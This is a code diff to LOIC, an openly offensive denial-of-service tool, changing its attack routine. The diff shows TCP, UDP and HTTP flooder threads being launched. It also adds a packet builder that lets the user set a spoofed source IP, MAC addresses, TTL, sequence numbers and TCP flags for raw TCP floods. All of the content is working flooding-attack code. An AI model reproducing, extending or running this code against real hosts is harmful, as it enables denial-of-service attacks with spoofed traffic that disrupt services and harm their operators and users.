@@ -482,7 +482,7 @@ namespace LOIC
 			if (!hive) disableHive.Checked = true;
 
 			CheckForIllegalCrossThreadCalls = false;
-			tbSourceIP.Text = Utils.LocalIPAddress();
+			txtSourceIP.Text = Utils.LocalIPAddress();
 			IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
 			if (allDevices.Count == 0)
 			{
@@ -498,8 +498,8 @@ namespace LOIC
 		private static TCPFlooder[] tcpFlooder;
 		private static XXPFlooder[] udpFlooder;
 		private static HTTPFlooder[] httpFlooder;
-		private static Packet Packet;
 		private bool _silent;
+		private static Flags Flags;
 
 		private void Attack(bool toggle, bool on)
 		{
@@ -520,9 +520,10 @@ namespace LOIC
 				if (Settings.AttackType == AttackTypes.TcpFlood)
 				{
 					tcpFlooder = new TCPFlooder[Settings.NumThreads];
+					Packet packet = CreatePacket();
 					for (int a = 0; a < tcpFlooder.Length; a++)
 					{
-						tcpFlooder[a] = new TCPFlooder(Packet,Settings.SelectedDevice,Settings.Delay);
+						tcpFlooder[a] = new TCPFlooder(packet,Settings.SelectedDevice,Settings.Delay);
 						tcpFlooder[a].Start();
 					}
 				}
@@ -531,7 +532,7 @@ namespace LOIC
 					udpFlooder = new XXPFlooder[Settings.NumThreads];
 					for (int a = 0; a < udpFlooder.Length; a++)
 					{
-						udpFlooder[a] = new XXPFlooder(Settings.TargetIp, Settings.TargetPort, Settings.AttackType, Settings.Delay, chkWaitReply.Checked, Settings.Payload, chkAllowRandom.Checked);
+						udpFlooder[a] = new XXPFlooder(Settings.TargetIP, Settings.TargetPort, Settings.AttackType, Settings.Delay, chkWaitReply.Checked, Settings.Payload, chkAllowRandom.Checked);
 						udpFlooder[a].Start();
 					}
 				}
@@ -540,7 +541,7 @@ namespace LOIC
 					httpFlooder = new HTTPFlooder[Settings.NumThreads];
 					for (int a = 0; a < httpFlooder.Length; a++)
 					{
-						httpFlooder[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIp, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
+						httpFlooder[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIP, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
 						httpFlooder[a].Start();
 					}
 				}
@@ -599,22 +600,12 @@ namespace LOIC
 				//Settings.Protocol = 3;
 			}
 
-			// flags
-			flags.SYN = cbSyn.Checked;
-			flags.ACK = cbAck.Checked;
-			flags.FIN = cbFin.Checked;
-			flags.RST = cbRst.Checked;
-			flags.URG = cbUrg.Checked;
-			flags.PSH = cbPsh.Checked;
-			flags.ENC = cbEnc.Checked;
-			flags.CWR = cbCwr.Checked;
-			flags.NONE = cbNone.Checked;
-			flags.NS = cbNs.Checked;
-
+			
 			// target
 			try
 			{
 				Settings.TargetPort = Convert.ToInt32(txtPort.Text);
+				Settings.SourcePort = Convert.ToInt32(txtSourcePort.Text);
 			}
 			catch
 			{
@@ -632,16 +623,44 @@ namespace LOIC
 
 			try
 			{
-				Settings.TargetIp = txtTarget.Text;
-				if (String.IsNullOrEmpty(Settings.TargetIp) || String.Equals(Settings.TargetIp, "N O N E !"))
-					throw new Exception("Select a target.");
+				Settings.TargetIP = txtTarget.Text;
+				Settings.SourceIP = txtSourceIP.Text;
+				if (String.IsNullOrEmpty(Settings.TargetIP) || String.Equals(Settings.TargetIP, "N O N E !"))
+					throw new Exception("Fill in target or source IP.");
 			}
 			catch
 			{
-				throw new Exception("What on earth made you put THAT in the target field?");
+				throw new Exception("What on earth made you put THAT in the IP field?");
 			}
 
-			if (String.IsNullOrEmpty(Settings.TargetHost)) Settings.TargetHost = Settings.TargetIp;
+			try
+			{
+				// flags
+				flags.SYN = cbSyn.Checked;
+				flags.ACK = cbAck.Checked;
+				flags.FIN = cbFin.Checked;
+				flags.RST = cbRst.Checked;
+				flags.URG = cbUrg.Checked;
+				flags.PSH = cbPsh.Checked;
+				flags.ENC = cbEnc.Checked;
+				flags.CWR = cbCwr.Checked;
+				flags.NONE = cbNone.Checked;
+				flags.NS = cbNs.Checked;
+
+				Settings.Timeout = Convert.ToInt32(txtTimeout.Text);
+				Settings.ID = Convert.ToUInt16((txtIdNo.Text));
+				Settings.TTL = Convert.ToByte(txtTimeToLive.Text);
+				Settings.AcknoledgeNumber = Convert.ToUInt32(txtAckNo.Text);
+				Settings.SequenceNumber = Convert.ToUInt32(txtSeqNo.Text);
+				Settings.SourceMac = txtSourceMac.Text;
+				Settings.DestinationMac = txtDestMac.Text;
+			}
+			catch
+			{
+				throw new Exception("Check Flag Settings!");
+			}
+
+			if (String.IsNullOrEmpty(Settings.TargetHost)) Settings.TargetHost = Settings.TargetIP;
 			if (!Settings.TargetHost.Contains("://")) Settings.TargetHost = String.Concat("http://", Settings.TargetHost);
 			Settings.TargetHost = new Uri(Settings.TargetHost).Host;
 
@@ -654,16 +673,28 @@ namespace LOIC
 			if (!Settings.RelativePath.StartsWith("/") && (Settings.AttackType == AttackTypes.HttpFlood))
 				throw new Exception("You have to enter a subsite (for example \"/\")");
 
-			try
-			{
-				Settings.Timeout = Convert.ToInt32(txtTimeout.Text);
-			}
-			catch
-			{
-				throw new Exception("What's up with something like that in the timeout box? =S");
-			}
+			
 		}
 
+		private Packet CreatePacket()
+		{
+			return TCPFlooder.BuildTcpPacket(
+				Settings.SourceIP,
+				Settings.TargetIP,
+				Settings.SourcePort,
+				Settings.TargetPort,
+				Flags,
+				Settings.Payload,
+				Settings.SourceMac,
+				Settings.DestinationMac,
+				Settings.ID,
+				Settings.TTL,
+				Settings.SequenceNumber,
+				Settings.AcknoledgeNumber,
+				Settings.WindowNumber
+				);
+		}
+		
 		private void LockOnIP()
 		{
 			if (txtTargetIP.Text.Length == 0)
@@ -788,7 +819,7 @@ namespace LOIC
 						int iaRequested = httpFlooder[a].Requested;
 						int iaFailed = httpFlooder[a].Failed;
 						httpFlooder[a] = null;
-						httpFlooder[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIp, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
+						httpFlooder[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIP, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
 						httpFlooder[a].Downloaded = iaDownloaded;
 						httpFlooder[a].Requested = iaRequested;
 						httpFlooder[a].Failed = iaFailed;
@@ -843,5 +874,10 @@ namespace LOIC
 		private delegate void AddListBoxItemDelegate(object sender, ReadLineEventArgs e);
 
 		private delegate void SetStatusDelegate(string status);
+
+		private void cbAck_CheckedChanged(object sender, EventArgs e)
+		{
+			txtAckNo.Enabled = cbAck.Checked;
+		}
 	}
 }
